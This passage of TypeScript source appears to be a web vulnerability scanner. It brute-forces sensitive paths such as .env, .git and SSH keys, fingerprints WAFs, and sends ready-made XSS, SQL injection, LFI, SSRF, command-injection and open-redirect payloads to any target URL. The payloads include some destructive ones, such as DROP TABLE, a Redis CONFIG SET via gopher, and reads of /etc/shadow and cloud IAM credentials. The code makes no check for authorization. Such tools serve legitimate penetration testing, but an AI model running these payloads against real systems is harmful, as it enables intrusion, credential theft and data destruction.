import axios, { AxiosResponse } from "axios";
import * as https from "https";
import * as dns from "dns";
import chalk from "chalk";
import ora from "ora";
import Table from "cli-table3";
import { log, logSilent } from "./logger";

const agent = new https.Agent({ rejectUnauthorized: false });

function normalizeUrl(url: string): string {
  if (!/^https?:\/\//i.test(url)) {
    url = "https://" + url;
  }
  return url;
}

function extractDomain(url: string): string {
  try {
    const u = new URL(normalizeUrl(url));
    return u.hostname;
  } catch {
    return url;
  }
}

export interface AvailabilityResult {
  url: string;
  isUp: boolean;
  statusCode: number | null;
  responseTime: number;
  sslValid: boolean;
  dnsResolved: boolean;
  redirectUrl: string | null;
  serverHeader: string | null;
  techStack: string[];
  wafDetected: boolean;
  wafName: string | null;
}

export interface DirScanResult {
  path: string;
  statusCode: number;
  size: number | null;
  found: boolean;
}

export interface HeaderScanResult {
  header: string;
  present: boolean;
  value: string | null;
  severity: "critical" | "warning" | "info";
}

export interface VulnResult {
  type: string;
  url: string;
  payload: string;
  evidence: string;
  severity: "critical" | "high" | "medium" | "low";
  confidence: number;
}

export interface SecurityRating {
  score: number;
  grade: string;
  color: chalk.Chalk;
  summary: string;
}

export interface FullScanResult {
  availability: AvailabilityResult;
  directories: DirScanResult[];
  headers: HeaderScanResult[];
  vulnerabilities: VulnResult[];
  rating: SecurityRating;
}

const COMMON_PATHS = [
  "/admin", "/admin/login", "/admin/dashboard", "/admin/config",
  "/administrator", "/admin.php", "/admin/index.php",
  "/wp-admin", "/wp-login.php", "/wp-config.php.bak", "/wp-content/debug.log",
  "/wp-includes/ms-default-constants.php", "/wp-json/wp/v2/users",
  "/login", "/signin", "/sign-in", "/auth", "/authenticate",
  "/api", "/api/v1", "/api/v2", "/api/docs", "/api/swagger",
  "/api/swagger.json", "/api/openapi.json", "/api/graphql",
  "/graphql", "/graphiql",
  "/.env", "/.env.bak", "/.env.local", "/.env.production",
  "/.git", "/.git/config", "/.git/HEAD", "/.git/index",
  "/.htaccess", "/.htpasswd", "/.DS_Store",
  "/config", "/config.php", "/config.json", "/config.yml", "/config.yaml",
  "/backup", "/backup.sql", "/backup.zip", "/backup.tar.gz", "/backup/",
  "/db", "/database", "/database.sql", "/dump.sql", "/db_backup.sql",
  "/phpmyadmin", "/phpmyadmin/", "/pma", "/phpinfo.php", "/info.php",
  "/server-status", "/server-info", "/.server-status",
  "/robots.txt", "/sitemap.xml", "/.well-known/security.txt",
  "/swagger.json", "/swagger-ui", "/swagger-ui.html",
  "/actuator", "/actuator/health", "/actuator/env", "/actuator/mappings",
  "/actuator/configprops", "/actuator/trace", "/actuator/logfile",
  "/console", "/debug", "/test", "/dev",
  "/uploads", "/upload", "/files", "/media",
  "/cgi-bin", "/cgi-bin/test", "/cgi-bin/status",
  "/xmlrpc.php", "/xmlrpc",
  "/favicon.ico", "/crossdomain.xml", "/clientaccesspolicy.xml",
  "/WEB-INF", "/WEB-INF/web.xml", "/WEB-INF/classes/",
  "/META-INF", "/META-INF/MANIFEST.MF",
  "/jenkins", "/.jenkins", "/jenkins/login",
  "/solr", "/solr/admin", "/kibana", "/kibana/app/kibana",
  "/elasticsearch", "/_cat/indices",
  "/.svn", "/.svn/entries", "/.svn/wc.db",
  "/.hg", "/.hg/store", "/.hg/requires",
  "/composer.json", "/composer.lock", "/package.json", "/package-lock.json",
  "/node_modules", "/yarn.lock", "/Gemfile", "/Gemfile.lock",
  "/Dockerfile", "/docker-compose.yml", "/docker-compose.yaml",
  "/.dockerenv", "/.dockerignore",
  "/nginx_status", "/stub_status",
  "/elmah.axd", "/trace.axd",
  "/error", "/errors", "/500", "/404",
  "/health", "/healthz", "/alive", "/ready", "/readiness",
  "/metrics", "/prometheus",
  "/api/keys", "/api/token", "/api/auth", "/api/oauth",
  "/static", "/public", "/assets", "/dist",
  "/tmp", "/temp", "/cache",
  "/install", "/installer", "/setup.php", "/install.php",
  "/changelog", "/CHANGELOG", "/CHANGELOG.md",
  "/TODO", "/README", "/readme.md", "/README.md",
  "/SECURITY", "/SECURITY.md",
  "/LICENSE", "/license.txt",
  "/debug.log", "/error.log", "/access.log", "/app.log",
  "/id_rsa", "/id_dsa", "/.ssh", "/.ssh/authorized_keys",
  "/wp-config.php~", "/config.php~", "/.index.php.swp", "/index.php.bak",
  "/index.php.old", "/index.php.orig", "/index.php.save",
];

const SECURITY_HEADERS: Array<{
  name: string;
  severity: "critical" | "warning" | "info";
  desc: string;
}> = [
  { name: "content-security-policy", severity: "critical", desc: "Prevents XSS and data injection" },
  { name: "x-frame-options", severity: "warning", desc: "Prevents clickjacking" },
  { name: "x-content-type-options", severity: "warning", desc: "Prevents MIME sniffing" },
  { name: "x-xss-protection", severity: "warning", desc: "Enables browser XSS filter" },
  { name: "strict-transport-security", severity: "critical", desc: "Forces HTTPS connections" },
  { name: "referrer-policy", severity: "info", desc: "Controls referrer information" },
  { name: "permissions-policy", severity: "info", desc: "Controls browser features" },
  { name: "x-permitted-cross-domain-policies", severity: "info", desc: "Controls cross-domain access" },
  { name: "feature-policy", severity: "info", desc: "Legacy browser feature control" },
  { name: "x-request-id", severity: "info", desc: "Request tracing" },
  { name: "cache-control", severity: "warning", desc: "Controls caching behavior" },
  { name: "access-control-allow-origin", severity: "warning", desc: "CORS policy" },
];

const XSS_PAYLOADS = [
  '<script>alert(1)</script>',
  '"><script>alert(1)</script>',
  "'-alert(1)-'",
  '<img src=x onerror=alert(1)>',
  '"><img src=x onerror=alert(1)>',
  "<svg onload=alert(1)>",
  "javascript:alert(1)",
  '<body onload=alert(1)>',
  '<input onfocus=alert(1) autofocus>',
  '<marquee onstart=alert(1)>',
  '<details open ontoggle=alert(1)>',
  '<select autofocus onfocus=alert(1)>',
  '<textarea autofocus onfocus=alert(1)>',
  '<video src=x onerror=alert(1)>',
  '<audio src=x onerror=alert(1)>',
  '<iframe src="javascript:alert(1)">',
  '{{7*7}}',
  '${7*7}',
  '<%=7*7%>',
  "{{constructor.constructor('return alert(1)')()}}",
  '#{7*7}',
  '*{background:url("javascript:alert(1)")}',
  '<ScRiPt>alert(1)</ScRiPt>',
  '<scr%00ipt>alert(1)</script>',
  '<scr\tipt>alert(1)</script>',
  '<img/src=x onerror=alert(1)>',
  '<svg/onload=alert(1)>',
  '"><svg/onload=alert(1)>',
  "'-alert(1)-'",
  "data:text/html,<script>alert(1)</script>",
];

const SQLI_PAYLOADS = [
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  '" OR "1"="1',
  "1' OR '1'='1",
  "1 OR 1=1",
  "1 OR 1=1--",
  "1 OR 1=1/*",
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL,NULL--",
  "' UNION SELECT NULL,NULL,NULL--",
  "' UNION SELECT NULL,NULL,NULL,NULL--",
  "1; DROP TABLE users--",
  "' AND 1=CONVERT(int,(SELECT @@version))--",
  "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
  "1' AND SLEEP(5)--",
  "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
  "1' WAITFOR DELAY '0:0:5'--",
  "' OR 1=1 LIMIT 1--",
  "admin'--",
  "admin' #",
  "admin'/*",
  "1' ORDER BY 1--",
  "1' ORDER BY 10--",
  "1' GROUP BY 1--",
  "' AND SUBSTRING(@@version,1,1)='5'",
  "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>65",
  "1' UNION ALL SELECT CONCAT(username,0x3a,password) FROM users--",
  "') OR '1'='1--",
  "1') OR ('1'='1--",
  "' OR 1=1#",
  "{ '$or': [ { }, { } ] }",
  "{ $ne: '' }",
  "{ $gt: '' }",
];

const LFI_PAYLOADS = [
  "../../../../etc/passwd",
  "../../../../../etc/passwd",
  "../../../../../../../../etc/passwd",
  "/etc/passwd",
  "/etc/passwd%00",
  "../../../../etc/passwd%00.jpg",
  "../../../../etc/shadow",
  "../../../../etc/hosts",
  "../../../../proc/self/environ",
  "../../../../proc/self/cmdline",
  "../../../../proc/self/fd/0",
  "/proc/self/environ",
  "/proc/version",
  "../../../../var/log/apache2/access.log",
  "../../../../var/log/httpd/access_log",
  "../../../../var/log/nginx/access.log",
  "../../../../usr/local/apache/logs/error.log",
  "../../../../var/log/auth.log",
  "../../../../etc/mysql/my.cnf",
  "../../../../etc/postgresql/postgresql.conf",
  "php://filter/convert.base64-encode/resource=index.php",
  "php://filter/convert.base64-encode/resource=config.php",
  "php://input",
  "php://filter/read=convert.base64-encode/resource=/etc/passwd",
  "....//....//....//etc/passwd",
  "..%2f..%2f..%2f..%2fetc%2fpasswd",
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  "..%252f..%252f..%252fetc%252fpasswd",
  "..%c0%af..%c0%af..%c0%afetc/passwd",
  "../../../../windows/system32/config/sam",
  "../../../../windows/repair/sam",
  "C:\\windows\\system32\\config\\sam",
];

const SSRF_PAYLOADS = [
  "http://127.0.0.1",
  "http://localhost",
  "http://localhost:8080",
  "http://localhost:443",
  "http://localhost:22",
  "http://localhost:3306",
  "http://localhost:6379",
  "http://0.0.0.0",
  "http://0x7f000001",
  "http://0177.0.0.1",
  "http://[::1]",
  "http://[::ffff:127.0.0.1]",
  "http://169.254.169.254/latest/meta-data/",
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  "http://metadata.google.internal/computeMetadata/v1/",
  "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys",
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
  "http://100.100.100.200/latest/meta-data/",
  "http://wireguard://127.0.0.1",
  "http://127.0.0.1:6379/CONFIG%20GET%20requirepass",
  "file:///etc/passwd",
  "file:///proc/self/environ",
  "gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html",
  "dict://127.0.0.1:6379/INFO",
];

const CMDI_PAYLOADS = [
  "; id",
  "| id",
  "&& id",
  "|| id",
  "`id`",
  "$(id)",
  "\nid",
  "; cat /etc/passwd",
  "| cat /etc/passwd",
  "`cat /etc/passwd`",
  "$(cat /etc/passwd)",
  "& id",
  "%0aid",
  "%0a cat /etc/passwd",
  "; whoami",
  "| whoami",
  "`whoami`",
  "$(whoami)",
  "; uname -a",
  "| uname -a",
  "; ls -la",
  "| ls -la",
  "& dir",
  "| dir",
  "& ipconfig",
  "| ipconfig",
  "; ping -c 1 127.0.0.1",
  "`sleep 5`",
  "|sleep 5",
  ";sleep 5",
];

const PATH_TRAVERSAL_PAYLOADS = [
  "../../../etc/passwd",
  "../../../../etc/passwd",
  "../../../../../etc/passwd",
  "/etc/passwd",
  "\\..\\..\\..\\windows\\system32\\config\\sam",
  "..\\..\\..\\..\\windows\\repair\\sam",
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
  "..%c0%af..%c0%af..%c0%afetc/passwd",
  "..%252f..%252f..%252fetc%252fpasswd",
  "....//....//....//etc/passwd",
  "..;/....;/....;/etc/passwd",
];

const SQL_ERROR_PATTERNS = [
  /sql syntax.*?mysql/i,
  /warning.*?\Wmysqli?/i,
  /valid postgresql/i,
  /pl\/pgsql.*?error/i,
  /unclosed quotation mark/i,
  /syntax error.*?sql/i,
  /oracle.*?error/i,
  /microsoft.*?odbc.*?sql server/i,
  /sqlite\/journal/i,
  /sqlite3::query/i,
  /pdoexception/i,
  /sqlstate\[\d+\]/i,
  /mysql_fetch/i,
  /mysql_num_rows/i,
  /pg_query/i,
  /syntax error or access violation/i,
  /unterminated string/i,
  /quoted string not properly terminated/i,
  /sqlcommand not properly ended/i,
  /ORA-\d{5}/i,
  /Microsoft OLE DB Provider/i,
  /ODBC SQL Server Driver/i,
  /SQLServer JDBC Driver/i,
  /com\.microsoft\.sqlserver/i,
  /org\.postgresql\.util\.PSQLException/i,
  /Syntax error in string in query expression/i,
  /ADODB\.Field.*?error/i,
];

const XSS_EVIDENCE_PATTERNS = [
  /<script>alert\(1\)<\/script>/i,
  /onerror\s*=\s*alert/i,
  /onload\s*=\s*alert/i,
  /javascript:alert/i,
  /onfocus\s*=\s*alert/i,
  /ontoggle\s*=\s*alert/i,
  /onstart\s*=\s*alert/i,
  /<svg[^>]*onload/i,
  /<img[^>]*onerror/i,
  /<input[^>]*autofocus[^>]*onfocus/i,
];

const LFI_EVIDENCE_PATTERNS = [
  /root:[x*]:0:0:/i,
  /\[core\]/i,
  /DOCUMENT_ROOT/i,
  /HTTP_HOST/i,
  /PATH=/i,
  /Apache\/\d/i,
  /nginx\/\d/i,
];

const CMDI_EVIDENCE_PATTERNS = [
  /uid=\d+\(?\w+\)?\s+gid=\d+/i,
  /root:\w+:\d+:\d+/i,
  /total\s+\d+\s+\w+\s+\w+/i,
  /Directory of\s+/i,
  /Volume Serial Number/i,
  /Linux\s+\S+\s+\S+/i,
];

const SSRF_EVIDENCE_PATTERNS = [
  /ami-[a-z0-9]+/i,
  /instance-id/i,
  /computeMetadata/i,
  /iam/i,
  /security-credentials/i,
  /local_hostname/i,
  /availability-zone/i,
];

const WAF_SIGNATURES: Array<{ name: string; pattern: RegExp; header?: string; code?: number }> = [
  { name: "Cloudflare", pattern: /cf-ray|cloudflare|__cfduid/i, header: "cf-ray" },
  { name: "AWS WAF", pattern: /awselb|x-amzn-requestid|x-amz-cf-id/i, header: "x-amz-cf-id" },
  { name: "Akamai", pattern: /akamai|x-akamai|x-cache.*akamai/i, header: "x-akamai-transformed" },
  { name: "Imperva/Incapsula", pattern: /incap_ses|visid_incap|incapsula|i_am_human/i, header: "x-cdn" },
  { name: "Sucuri", pattern: /sucuri|x-sucuri-id/i, header: "x-sucuri-id" },
  { name: "F5 BIG-IP ASM", pattern: /bigip|f5|x-wa-info/i, header: "x-wa-info" },
  { name: "ModSecurity", pattern: /mod_security|modsecurity/i },
  { name: "Wordfence", pattern: /wordfence/i },
  { name: "Nginx WAF", pattern: /nginx.*403 forbidden/i, code: 403 },
  { name: "Barracuda", pattern: /barracuda/i },
  { name: "Fortinet", pattern: /fortinet|fortiweb/i },
  { name: "Trustwave", pattern: /trustwave/i },
  { name: "DenyAll", pattern: /denyall|rweb/i },
  { name: "IBM XGS", pattern: /ibm.*proventia|ibm.*xgs/i },
  { name: "dotDefender", pattern: /dotdefender/i },
];

function detectWAF(response: AxiosResponse): { detected: boolean; name: string | null } {
  for (const sig of WAF_SIGNATURES) {
    if (sig.header && sig.header.length > 0) {
      const h = Object.keys(response.headers).find((k) => k.toLowerCase() === sig.header!.toLowerCase());
      if (h) return { detected: true, name: sig.name };
    }
    const headers = JSON.stringify(response.headers);
    const body = typeof response.data === "string" ? response.data : JSON.stringify(response.data);
    if (sig.pattern.test(headers) || sig.pattern.test(body)) {
      return { detected: true, name: sig.name };
    }
    if (sig.code && response.status === sig.code) {
      return { detected: true, name: sig.name };
    }
  }
  return { detected: false, name: null };
}

function detectTechStack(response: AxiosResponse): string[] {
  const tech: string[] = [];
  const headers = response.headers as Record<string, string>;
  const body = typeof response.data === "string" ? response.data : JSON.stringify(response.data);

  const server = headers["server"] || "";
  if (/nginx/i.test(server)) tech.push("Nginx");
  if (/apache/i.test(server)) tech.push("Apache");
  if (/iis/i.test(server)) tech.push("IIS");
  if (/litespeed/i.test(server)) tech.push("LiteSpeed");
  if (/openresty/i.test(server)) tech.push("OpenResty");
  if (/caddy/i.test(server)) tech.push("Caddy");

  const powered = headers["x-powered-by"] || "";
  if (/php/i.test(powered)) tech.push("PHP");
  if (/express/i.test(powered)) tech.push("Express.js");
  if (/asp\.net/i.test(powered)) tech.push("ASP.NET");
  if (/next/i.test(powered)) tech.push("Next.js");
  if (/rails/i.test(powered)) tech.push("Ruby on Rails");
  if (/django/i.test(powered)) tech.push("Django");
  if (/laravel/i.test(powered)) tech.push("Laravel");

  if (/wp-content|wp-includes|wordpress/i.test(body)) tech.push("WordPress");
  if (/Joomla/i.test(body)) tech.push("Joomla");
  if (/drupal/i.test(body)) tech.push("Drupal");
  if (/shopify/i.test(body)) tech.push("Shopify");
  if (/react/i.test(body) || /_next\//i.test(body)) tech.push("React");
  if (/angular/i.test(body) || /ng-version/i.test(body)) tech.push("Angular");
  if (/vue/i.test(body) || /__vue__/i.test(body)) tech.push("Vue.js");
  if (/jquery/i.test(body)) tech.push("jQuery");
  if (/bootstrap/i.test(body)) tech.push("Bootstrap");

  if (headers["x-drupal-cache"]) tech.push("Drupal");
  if (headers["x-Generator"]?.includes("Drupal")) tech.push("Drupal");

  return [...new Set(tech)];
}

export async function checkAvailability(url: string): Promise<AvailabilityResult> {
  const normalizedUrl = normalizeUrl(url);
  const domain = extractDomain(url);

  const spinner = ora(chalk.cyan("Checking availability...")).start();

  let dnsResolved = false;
  try {
    await new Promise<string>((resolve, reject) => {
      dns.resolve4(domain, (err, addresses) => {
        if (err) reject(err);
        else resolve(addresses[0]);
      });
    });
    dnsResolved = true;
    logSilent("INFO", `DNS resolved: ${domain}`);
  } catch {
    dnsResolved = false;
    logSilent("WARN", `DNS resolution failed: ${domain}`);
  }

  let isUp = false;
  let statusCode: number | null = null;
  let responseTime = 0;
  let sslValid = false;
  let redirectUrl: string | null = null;
  let serverHeader: string | null = null;
  let techStack: string[] = [];
  let wafDetected = false;
  let wafName: string | null = null;

  const start = Date.now();
  try {
    const response: AxiosResponse = await axios.get(normalizedUrl, {
      timeout: 10000,
      maxRedirects: 5,
      validateStatus: () => true,
      httpsAgent: agent,
    });
    responseTime = Date.now() - start;
    statusCode = response.status;
    isUp = statusCode < 500;
    serverHeader = response.headers["server"] || null;
    techStack = detectTechStack(response);

    const waf = detectWAF(response);
    wafDetected = waf.detected;
    wafName = waf.name;

    if (wafDetected) {
      logSilent("WARN", `WAF detected: ${wafName}`);
    }

    if (response.request?.res?.responseUrl && response.request.res.responseUrl !== normalizedUrl) {
      redirectUrl = response.request.res.responseUrl;
    }

    try {
      const u = new URL(normalizedUrl);
      if (u.protocol === "https:") {
        const certReq = await new Promise<boolean>((resolve) => {
          const req = https.request(
            { hostname: u.hostname, port: 443, method: "HEAD", rejectUnauthorized: true },
            (res) => {
              resolve(true);
              res.resume();
            }
          );
          req.on("error", () => resolve(false));
          req.setTimeout(5000, () => { req.destroy(); resolve(false); });
          req.end();
        });
        sslValid = certReq;
      }
    } catch {
      sslValid = false;
    }

    logSilent("OK", `Site is up: ${normalizedUrl} [${statusCode}] ${responseTime}ms | Tech: ${techStack.join(", ") || "Unknown"}`);
  } catch (err: any) {
    responseTime = Date.now() - start;
    isUp = false;
    logSilent("ERROR", `Site is down: ${normalizedUrl} - ${err.message}`);
  }

  spinner.stop();

  return { url: normalizedUrl, isUp, statusCode, responseTime, sslValid, dnsResolved, redirectUrl, serverHeader, techStack, wafDetected, wafName };
}

export async function scanDirectories(url: string): Promise<DirScanResult[]> {
  const baseUrl = normalizeUrl(url);
  const results: DirScanResult[] = [];

  const spinner = ora(chalk.cyan(`Scanning ${COMMON_PATHS.length} paths...`)).start();
  let completed = 0;

  const batchSize = 15;
  for (let i = 0; i < COMMON_PATHS.length; i += batchSize) {
    const batch = COMMON_PATHS.slice(i, i + batchSize);
    const promises = batch.map(async (p) => {
      try {
        const res = await axios.get(baseUrl + p, {
          timeout: 5000,
          validateStatus: () => true,
          httpsAgent: agent,
          maxRedirects: 0,
        });
        const found = res.status >= 200 && res.status < 400;
        const result: DirScanResult = {
          path: p,
          statusCode: res.status,
          size: parseInt(res.headers["content-length"] || "0") || null,
          found,
        };
        if (found) {
          logSilent("FIND", `Found: ${p} [${res.status}]`);
        }
        return result;
      } catch {
        return { path: p, statusCode: 0, size: null, found: false } as DirScanResult;
      }
    });

    const batchResults = await Promise.all(promises);
    results.push(...batchResults);
    completed += batch.length;
    spinner.text = chalk.cyan(`Scanning paths... ${completed}/${COMMON_PATHS.length}`);
  }

  spinner.stop();
  return results;
}

export async function scanHeaders(url: string): Promise<HeaderScanResult[]> {
  const normalizedUrl = normalizeUrl(url);
  const spinner = ora(chalk.cyan("Checking security headers...")).start();

  let headers: Record<string, string> = {};
  try {
    const response = await axios.head(normalizedUrl, {
      timeout: 10000,
      validateStatus: () => true,
      httpsAgent: agent,
    });
    headers = response.headers as Record<string, string>;
  } catch {
    try {
      const response = await axios.get(normalizedUrl, {
        timeout: 10000,
        validateStatus: () => true,
        httpsAgent: agent,
      });
      headers = response.headers as Record<string, string>;
    } catch (err: any) {
      spinner.stop();
      log("ERROR", `Failed to fetch headers: ${err.message}`);
      return [];
    }
  }

  const results: HeaderScanResult[] = SECURITY_HEADERS.map((h) => {
    const key = Object.keys(headers).find((k) => k.toLowerCase() === h.name);
    const present = !!key;
    const value = key ? headers[key] : null;
    if (!present) {
      logSilent("WARN", `Missing header: ${h.name}`);
    } else {
      logSilent("OK", `Header present: ${h.name}`);
    }
    return { header: h.name, present, value, severity: h.severity };
  });

  spinner.stop();
  return results;
}

async function testXSS(baseUrl: string, endpoints: Array<{ path: string; params: string[] }>): Promise<VulnResult[]> {
  const results: VulnResult[] = [];

  for (const endpoint of endpoints) {
    const testUrl = baseUrl + endpoint.path;
    for (const param of endpoint.params) {
      for (const payload of XSS_PAYLOADS) {
        try {
          const separator = testUrl.includes("?") ? "&" : "?";
          const fullUrl = `${testUrl}${separator}${param}=${encodeURIComponent(payload)}`;
          const res = await axios.get(fullUrl, {
            timeout: 5000,
            validateStatus: () => true,
            httpsAgent: agent,
          });

          const body = typeof res.data === "string" ? res.data : JSON.stringify(res.data);
          for (const pattern of XSS_EVIDENCE_PATTERNS) {
            if (pattern.test(body)) {
              results.push({
                type: "XSS",
                url: fullUrl,
                payload,
                evidence: `Reflected payload matched: ${pattern.source}`,
                severity: "high",
                confidence: 85,
              });
              logSilent("FIND", `XSS: ${fullUrl} [${payload.substring(0, 30)}]`);
              break;
            }
          }
        } catch {}
      }
    }
  }

  return results;
}

async function testSQLi(baseUrl: string, endpoints: Array<{ path: string; params: string[] }>): Promise<VulnResult[]> {
  const results: VulnResult[] = [];

  for (const endpoint of endpoints) {
    const testUrl = baseUrl + endpoint.path;
    for (const param of endpoint.params) {
      for (const payload of SQLI_PAYLOADS) {
        try {
          const separator = testUrl.includes("?") ? "&" : "?";
          const fullUrl = `${testUrl}${separator}${param}=${encodeURIComponent(payload)}`;
          const start = Date.now();
          const res = await axios.get(fullUrl, {
            timeout: 12000,
            validateStatus: () => true,
            httpsAgent: agent,
          });
          const elapsed = Date.now() - start;

          const body = typeof res.data === "string" ? res.data : JSON.stringify(res.data);

          for (const pattern of SQL_ERROR_PATTERNS) {
            if (pattern.test(body)) {
              results.push({
                type: "SQLi",
                url: fullUrl,
                payload,
                evidence: `SQL error pattern: ${pattern.source}`,
                severity: "critical",
                confidence: 90,
              });
              logSilent("FIND", `SQLi error: ${fullUrl}`);
              break;
            }
          }

          if (/SLEEP|WAITFOR|sleep/i.test(payload) && elapsed >= 4500) {
            results.push({
              type: "SQLi",
              url: fullUrl,
              payload,
              evidence: `Time-based: response took ${elapsed}ms (expected ~5000ms)`,
              severity: "critical",
              confidence: 75,
            });
            logSilent("FIND", `SQLi time-based: ${fullUrl} [${elapsed}ms]`);
          }

          const origLen = body.length;
        } catch {}
      }
    }
  }

  return results;
}

async function testLFI(baseUrl: string): Promise<VulnResult[]> {
  const results: VulnResult[] = [];
  const lfiParams = ["file", "page", "path", "include", "view", "doc", "document", "folder", "template", "lang", "module", "src", "content", "name", "action"];

  for (const param of lfiParams) {
    for (const payload of LFI_PAYLOADS) {
      try {
        const testUrl = `${baseUrl}/?${param}=${encodeURIComponent(payload)}`;
        const res = await axios.get(testUrl, {
          timeout: 5000,
          validateStatus: () => true,
          httpsAgent: agent,
        });

        const body = typeof res.data === "string" ? res.data : JSON.stringify(res.data);
        for (const pattern of LFI_EVIDENCE_PATTERNS) {
          if (pattern.test(body)) {
            results.push({
              type: "LFI",
              url: testUrl,
              payload,
              evidence: `LFI pattern matched: ${pattern.source}`,
              severity: "critical",
              confidence: 85,
            });
            logSilent("FIND", `LFI: ${testUrl}`);
            break;
          }
        }
      } catch {}
    }
  }

  return results;
}

async function testSSRF(baseUrl: string): Promise<VulnResult[]> {
  const results: VulnResult[] = [];
  const ssrfParams = ["url", "link", "site", "host", "source", "target", "dest", "redirect", "uri", "address", "domain", "callback", "return", "next", "feed", "img", "image", "reference", "fetch", "proxy"];

  for (const param of ssrfParams) {
    for (const payload of SSRF_PAYLOADS.slice(0, 12)) {
      try {
        const testUrl = `${baseUrl}/?${param}=${encodeURIComponent(payload)}`;
        const res = await axios.get(testUrl, {
          timeout: 8000,
          validateStatus: () => true,
          httpsAgent: agent,
        });

        const body = typeof res.data === "string" ? res.data : JSON.stringify(res.data);
        for (const pattern of SSRF_EVIDENCE_PATTERNS) {
          if (pattern.test(body)) {
            results.push({
              type: "SSRF",
              url: testUrl,
              payload,
              evidence: `SSRF evidence: ${pattern.source}`,
              severity: "high",
              confidence: 80,
            });
            logSilent("FIND", `SSRF: ${testUrl}`);
            break;
          }
        }

        if (res.status === 200 && payload.includes("127.0.0.1") && body.length > 0) {
          const origRes = await axios.get(baseUrl, { timeout: 5000, validateStatus: () => true, httpsAgent: agent });
          const origBody = typeof origRes.data === "string" ? origRes.data : JSON.stringify(origRes.data);
          if (body !== origBody && body.length > 100) {
            results.push({
              type: "SSRF",
              url: testUrl,
              payload,
              evidence: `Different response from internal resource (${body.length} bytes vs ${origBody.length} bytes)`,
              severity: "high",
              confidence: 60,
            });
          }
        }
      } catch {}
    }
  }

  return results;
}

async function testCMDi(baseUrl: string): Promise<VulnResult[]> {
  const results: VulnResult[] = [];
  const cmdiParams = ["cmd", "exec", "command", "execute", "ping", "query", "jump", "code", "reg", "do", "func", "arg", "option", "load", "process", "step", "read", "feature", "eva", "var", "run"];

  for (const param of cmdiParams) {
    for (const payload of CMDI_PAYLOADS.slice(0, 10)) {
      try {
        const testUrl = `${baseUrl}/?${param}=${encodeURIComponent(payload)}`;
        const res = await axios.get(testUrl, {
          timeout: 8000,
          validateStatus: () => true,
          httpsAgent: agent,
        });

        const body = typeof res.data === "string" ? res.data : JSON.stringify(res.data);
        for (const pattern of CMDI_EVIDENCE_PATTERNS) {
          if (pattern.test(body)) {
            results.push({
              type: "CMDi",
              url: testUrl,
              payload,
              evidence: `Command output pattern: ${pattern.source}`,
              severity: "critical",
              confidence: 85,
            });
            logSilent("FIND", `CMDi: ${testUrl}`);
            break;
          }
        }
      } catch {}
    }
  }

  return results;
}

async function testPathTraversal(baseUrl: string): Promise<VulnResult[]> {
  const results: VulnResult[] = [];
  const ptParams = ["file", "path", "dir", "folder", "download", "doc", "document", "name", "filename", "img", "image", "resource", "src", "source", "attachment"];

  for (const param of ptParams) {
    for (const payload of PATH_TRAVERSAL_PAYLOADS) {
      try {
        const testUrl = `${baseUrl}/?${param}=${encodeURIComponent(payload)}`;
        const res = await axios.get(testUrl, {
          timeout: 5000,
          validateStatus: () => true,
          httpsAgent: agent,
        });

        const body = typeof res.data === "string" ? res.data : JSON.stringify(res.data);
        if (/root:[x*]:0:0:/i.test(body) || /boot\s+ini/i.test(body) || /\[boot loader\]/i.test(body)) {
          results.push({
            type: "PathTraversal",
            url: testUrl,
            payload,
            evidence: `File content exposed via path traversal`,
            severity: "high",
            confidence: 85,
          });
          logSilent("FIND", `PathTraversal: ${testUrl}`);
        }
      } catch {}
    }
  }

  return results;
}

async function testOpenRedirect(baseUrl: string): Promise<VulnResult[]> {
  const results: VulnResult[] = [];
  const redirectPaths = [
    "/redirect", "/go", "/link", "/url", "/r",
    "/login", "/auth", "/oauth", "/callback",
    "/return", "/next", "/continue", "/destination",
  ];
  const redirectParams = ["url", "redirect", "next", "return", "continue", "destination", "goto", "link", "site", "target"];

  for (const p of redirectPaths) {
    for (const param of redirectParams) {
      try {
        const testUrl = baseUrl + p + `?${param}=https://evil.example.com`;
        const res = await axios.get(testUrl, {
          timeout: 5000,
          validateStatus: () => true,
          httpsAgent: agent,
          maxRedirects: 0,
        });
        const location = res.headers["location"];
        if (location && location.includes("evil.example.com")) {
          results.push({
            type: "OpenRedirect",
            url: testUrl,
            payload: `${param}=https://evil.example.com`,
            evidence: `Redirects to: ${location}`,
            severity: "medium",
            confidence: 95,
          });
          logSilent("FIND", `OpenRedirect: ${testUrl}`);
        }
      } catch {}
    }
  }

  return results;
}

async function testInfoLeak(baseUrl: string): Promise<VulnResult[]> {
  const results: VulnResult[] = [];
  const infoLeakPaths = [
    { path: "/.git/config", pattern: /\[core\]/i, desc: "Git repository config exposed" },
    { path: "/.git/HEAD", pattern: /ref: refs/i, desc: "Git HEAD exposed" },
    { path: "/.env", pattern: /(?:DB_|APP_|SECRET|API_KEY|PASSWORD|DATABASE_URL|MONGO)/i, desc: "Environment variables exposed" },
    { path: "/.env.production", pattern: /(?:DB_|SECRET|KEY|PASS)/i, desc: "Production env file exposed" },
    { path: "/phpinfo.php", pattern: /phpinfo|php version/i, desc: "PHP info page exposed" },
    { path: "/server-status", pattern: /server status|current time/i, desc: "Apache server-status exposed" },
    { path: "/server-info", pattern: /server information/i, desc: "Apache server-info exposed" },
    { path: "/webpack.json", pattern: /(?:entry|output|module)/i, desc: "Webpack config exposed" },
    { path: "/composer.json", pattern: /(?:require|autoload)/i, desc: "Composer dependencies exposed" },
    { path: "/package.json", pattern: /(?:dependencies|scripts)/i, desc: "NPM dependencies exposed" },
    { path: "/.DS_Store", pattern: /Bud1/i, desc: "macOS DS_Store file exposed" },
    { path: "/debug.log", pattern: /(?:error|debug|exception|trace)/i, desc: "Debug log exposed" },
    { path: "/error.log", pattern: /(?:error|exception|trace|failed)/i, desc: "Error log exposed" },
    { path: "/actuator/env", pattern: /(?:property|value|source)/i, desc: "Spring Boot env endpoint exposed" },
